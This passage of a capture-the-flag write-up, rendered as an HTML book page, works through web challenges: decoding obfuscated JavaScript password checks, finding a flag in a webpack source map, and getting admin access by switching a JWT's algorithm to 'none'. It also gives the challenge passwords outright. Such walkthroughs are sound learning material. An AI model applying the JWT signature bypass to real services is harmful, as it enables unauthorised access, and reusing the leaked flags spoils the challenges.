ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\'')())()
        &lt;/script&gt;
</code></pre>
<p>What we do now is use <code>toString()</code> to decode the obfuscated code. What it does is, it will reveal the js code without actually executing the code. If you directly paste the obfuscated code, it will again alert the password input. let's replace the last <code>()</code> with <code>.toString()</code>.</p>
<img alt="image" src="https://github.com/user-attachments/assets/27aa5f3c-a32d-47e6-86ca-27314036d705" />
<p>You can see the code:</p>
<pre><code class="language-js">function anonymous() {
    let a = prompt('Entrez le mot de passe');
    if (a === 'REDACTED') {
        alert('bravo');
    } else {
        alert('fail...');
    }
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h3 id="obfuscation-js"><a class="header" href="#obfuscation-js">Obfuscation JS</a></h3>
<p>This time also reading source code but with a little bit change. We can see the password when we inspect the page but its url encoded.</p>
<img width="1040" height="473" alt="image" src="https://github.com/user-attachments/assets/1e74acfb-bbd1-4015-a2d1-264f5cc89a58" />
<p>I decoded the given encoded string/password and it gave me plain password.</p>
</br>
<img width="574" height="335" alt="image" src="https://github.com/user-attachments/assets/02ff5593-214d-477c-a0a1-31f931241019" />
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---obfuscation-2"><a class="header" href="#javascript---obfuscation-2">Javascript - Obfuscation 2</a></h3>
<p>Here after inspecting the page source , I find the following obfuscation js code. which seems like password we need but encrypted.</p>
<img width="1041" height="457" alt="picture2" src="https://github.com/user-attachments/assets/4a2a13f5-9c6b-4644-931e-56f2b8fc65a7" />
<p>Here we got something like</p>
<pre><code class="language-js">var pass = unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29");

OR

unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29
</code></pre>
<p>Let's fire up <a href="https://gchq.github.io/CyberChef/">CyberChef</a> and try to decode.</p>
<pre><code class="language-js">RECEIPE -&gt; URL decode
unescape("String.fromCharCode%28104%2C68%2C117%2C102%2C106%2C100%2C107%2C105%2C49%2C53%2C54%29")
twice
unescape("String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)")
</code></pre>
<p>Now we are near to the password, Let's check the password using the <code>console</code>.
<img width="692" height="127" alt="picture3" src="https://github.com/user-attachments/assets/a2a404dc-c4c6-4ae3-b773-6b1ab7d62e20" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---source"><a class="header" href="#javascript---source">Javascript - Source.</a></h3>
<p>As previous, just use inspect and try to read source. Wallah, we got the password</p>
<img width="1035" height="431" alt="image" src="https://github.com/user-attachments/assets/a2bb3661-addf-4d8f-9103-e092646aa67e" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-3"><a class="header" href="#javascript---obfuscation-3">Javascript - Obfuscation 3</a></h1>
<p>We got another JS obfuscation chall, Here I got <code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code> this in source code.</p>
<p>And The pattern seems to be of hex like
<code>\x35 = 0x35 = 53 in decimal = 5</code></p>
<p>Here we can use concole:</p>
<pre><code class="language-const layer1 = &quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;;">console.log("Layer 1 result:", layer1);
</code></pre>
<img  alt="image" src="https://github.com/user-attachments/assets/41cefbc0-1c8a-4c5b-9931-71dab85ec11f" />
<p>after converting all the hex, we got something like <code>55,56,54,79,115,69,114,116,107,49,50</code></p>
<p>now, lets use ansci decoding.</p>
<pre><code>const charCodes = "55,56,54,79,115,69,114,116,107,49,50";
const decoded = charCodes.split(',').map(code =&gt; String.fromCharCode(code)).join('');
console.log("Final result:", decoded);
</code></pre>
<img alt="image" src="https://github.com/user-attachments/assets/b9074bf0-56b8-4c71-80e4-51713ea2febd" />
<p>Now, we got the password: 786OsErtk12</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="javascript---webpack"><a class="header" href="#javascript---webpack">Javascript - Webpack</a></h2>
<p>AS the name suggests, I just started to look over the source codes like js and css and Under the file <code>app.a92c5074dafac0cb6365.js</code> I got a commented <code>.map</code> file. I just downloaded it and searched for <code>flag</code> string and got the password.</p>
<p>I took literally more than a hour to solve it, I went to the file first but I didn't searched for string <code>flag</code> but instead <code>password</code> and so much more. The recon is too much deeper than the solution.</p>
<img width="1081" height="390" alt="image" src="https://github.com/user-attachments/assets/0ff161a4-0655-4225-ae6b-b390f612b48f" />
<img width="729" height="421" alt="image" src="https://github.com/user-attachments/assets/b67c6e4c-ff27-4692-a38a-63683d00e7d3" />
<img width="880" height="372" alt="image" src="https://github.com/user-attachments/assets/e2260386-c0ec-4abe-8846-7d7832cc26f6" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-server"><a class="header" href="#web-server">WEB SERVER</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt---introduction"><a class="header" href="#jwt---introduction">JWT - Introduction</a></h1>
<p>Here we go again. we have got a login page and there is also a feature for <code>guest</code> login. As the challenge name suggestes, we need to access the admin panel to get the <code>flag</code> i.e. <code>password</code>,</p>
<p>So, I just logged in as guest to figure out the request and responce.</p>
<img  alt="image" src="https://github.com/user-attachments/assets/92c53262-1ca7-4c73-9ac7-c8b2eb5760b7" />
<p>steps:</p>
<ol>
<li>I already set up the <code>JWT Editor</code> extension in my burp, in order to play with tokens.</li>
<li>I just grab the request for <code>guest</code> login. and its seems like the <code>username</code> we have is <code>guest</code>, I tried to change it to <code>admin</code> but no luck.</li>
<li>There also you can see the <code>HS256</code> algorithm used, I tried to change it to <code>none</code> .</li>
</ol>
<img alt="image" src="https://github.com/user-attachments/assets/e145d585-09e2-4730-a37d-acbcbc46fd80" />
<p>And wallah, we got the admin access.</p>
<img alt="image" src="https://github.com/user-attachments/assets/e145d585-09e2-4730-a37d-acbcbc46fd80" />
<p>The password is <code>S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7</code></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
